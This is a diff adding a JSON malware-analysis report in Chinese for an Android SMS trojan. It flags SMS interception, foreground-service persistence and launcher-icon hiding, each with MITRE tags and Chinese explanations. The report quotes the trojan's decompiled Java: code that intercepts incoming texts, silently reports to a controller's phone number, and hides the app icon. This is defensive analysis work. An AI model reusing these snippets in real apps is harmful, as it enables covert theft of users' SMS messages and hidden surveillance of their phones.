@@ -1,0 +1,121 @@
+{
+  "APK信息": {
+    "文件名": "7d614c22c6be78cc5cff276a3da11894540f48a3d67c9a9e48dd34bc9753a064.apk",
+    "sha256": "7d614c22c6be78cc5cff276a3da11894540f48a3d67c9a9e48dd34bc9753a064",
+    "包名": "com.system.sms.demo",
+    "应用名": "免费名片赞",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 159.4
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "SMS_RECEIVED",
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\sms\\demo\\SmSReceiver;",
+          "method_signature": "if(intent.getAction()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (intent.getAction().equals(SmSserver.SMS_RECEIVED) || intent.getAction().equals(SmSserver.SMS_RECEIVED_2) || intent.getAction().equals(SmSserver.GSM_SMS_RECEIVED)) {\n    SmSutils smSutils = new SmSutils();\n    Bundle extras = intent.getExtras();\n    if (extras != null && smSutils.isflag()) {\n        smSutils.SendSms(extras, context, this);\n    }\n}\nif (intent.getAction().equals(SmSserver.SendState)) {\n    SmSutils smSutils2 = new SmSutils();\n    if (getResultCode() != -1) {\n        smSutils2.sendSMS(SmSutils.phone(context), new StringBuffer().append(\"指令执行失败状态码 \").append(getResultCode()).toString(), (Context) null);\n    }\n}",
+          "malicious_code_snippet_context": "      public void onReceive(Context context, Intent intent) {\n          Log.i(\"action\", intent.getAction());\n          this.sp = context.getSharedPreferences(\"config\", 0);\n>>>         if (intent.getAction().equals(SmSserver.SMS_RECEIVED) || intent.getAction().equals(SmSserver.SMS_RECEIVED_2) || intent.getAction().equals(SmSserver.GSM_SMS_RECEIVED)) {\n>>>             SmSutils smSutils = new SmSutils();\n>>>             Bundle extras = intent.getExtras();\n>>>             if (extras != null && smSutils.isflag()) {\n>>>                 smSutils.SendSms(extras, context, this);\n>>>             }\n>>>         }\n>>>         if (intent.getAction().equals(SmSserver.SendState)) {\n>>>             SmSutils smSutils2 = new SmSutils();\n>>>             if (getResultCode() != -1) {\n>>>                 smSutils2.sendSMS(SmSutils.phone(context), new StringBuffer().append(\"指令执行失败状态码 \").append(getResultCode()).toString(), (Context) null);\n>>>             } else {\n>>>                 smSutils2.sendSMS(SmSutils.phone(context), \"指令执行成功\", (Context) null);\n              }\n          }\n      }",
+          "behavior_description": "代码通过注册 BroadcastReceiver 监听系统短信接收广播（SMS_RECEIVED等），拦截用户收到的短信数据，并在满足条件时通过 SendSms 方法处理或转发这些短信。同时监听短信发送状态，若发送失败则静默发送短信向控制端报告指令执行状态，实现短信拦截与隐蔽通信功能。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\sms\\demo\\SmSserver;",
+          "method_signature": "onCreate()",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "startForeground(100, notification);\nintentFilter.addAction(SMS_RECEIVED);\nintentFilter.addAction(SMS_RECEIVED_2);\nintentFilter.addAction(GSM_SMS_RECEIVED);\nintentFilter.setPriority(1000);\nregisterReceiver(this.localMessageReceiver, intentFilter, \"android.permission.BROADCAST_SMS\", (Handler) null);\nnew SmSutils().sendSMS(SmSutils.phone(this), new StringBuffer().append(\"拦截服务已启动,软件到期时间\").append(SmSutils.endtime).toString(), (Context) null);",
+          "malicious_code_snippet_context": "          Intent intent = new Intent();\n          notification.contentView = new RemoteViews(getPackageName(), R.layout.activity_main);\n          notification.contentIntent = PendingIntent.getActivity(this, 0, intent, 0);\n>>>         startForeground(100, notification);\n>>>         IntentFilter intentFilter = new IntentFilter();\n>>>         intentFilter.addAction(SMS_RECEIVED);\n>>>         intentFilter.addAction(SMS_RECEIVED_2);\n>>>         intentFilter.addAction(GSM_SMS_RECEIVED);\n>>>         intentFilter.setPriority(1000);\n>>>         this.localMessageReceiver = new SmSReceiver();\n          registerReceiver(this.localMessageReceiver, intentFilter, \"android.permission.BROADCAST_SMS\", (Handler) null);\n          this.localMessageReceiver2 = new SmSReceiver();\n          registerReceiver(this.localMessageReceiver2, new IntentFilter(SendState));",
+          "behavior_description": "该代码在Service的onCreate中通过startForeground启动前台服务实现持久保活，同时注册高优先级(1000)的短信广播接收器拦截用户收到的短信，并在服务启动时静默发送短信到指定号码通知控制端'拦截服务已启动'。数据流向为：SmSutils.phone(this)获取目标号码 → sendSMS()静默发送短信，属于典型的短信拦截木马行为，会导致用户短信被劫持并产生短信费用损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\sms\\demo\\MainActivity;",
+          "method_signature": "onCreate(Bundle bundle)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "new SmSutils().sendSMS(SmSutils.phone(this), new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(\"拦截启动,回复com#false关闭com#true开启, 版本\").append(Build.VERSION.SDK_INT).toString()).append(\" \").toString()).append(Build.MODEL).toString(), (Context) null);\ngetPackageManager().setComponentEnabledSetting(getComponentName(), 2, 1);\nstartService(new Intent(this, Class.forName(\"com.system.sms.demo.SmSserver\")));\nfinish();",
+          "malicious_code_snippet_context": "          super.onCreate(bundle);\n          super.requestWindowFeature(1);\n          setContentView(R.layout.activity_main);\n>>>         new SmSutils().sendSMS(SmSutils.phone(this), new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(\"拦截启动,回复com#false关闭com#true开启, 版本\").append(Build.VERSION.SDK_INT).toString()).append(\" \").toString()).append(Build.MODEL).toString(), (Context) null);\n>>>         getPackageManager().setComponentEnabledSetting(getComponentName(), 2, 1);\n>>>         try {\n>>>             startService(new Intent(this, Class.forName(\"com.system.sms.demo.SmSserver\")));\n              finish();\n          } catch (ClassNotFoundException e) {\n              throw new NoClassDefFoundError(e.getMessage());",
+          "behavior_description": "应用启动后，首先通过sendSMS向攻击者指定号码发送包含设备SDK版本和型号的短信，报告感染状态及控制指令格式；随后调用setComponentEnabledSetting将自身组件设置为DISABLED（值2），使应用图标从启动器中隐藏；最后启动后台短信拦截服务SmSserver并调用finish()关闭界面，使用户无法感知应用运行，实现隐蔽驻留。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
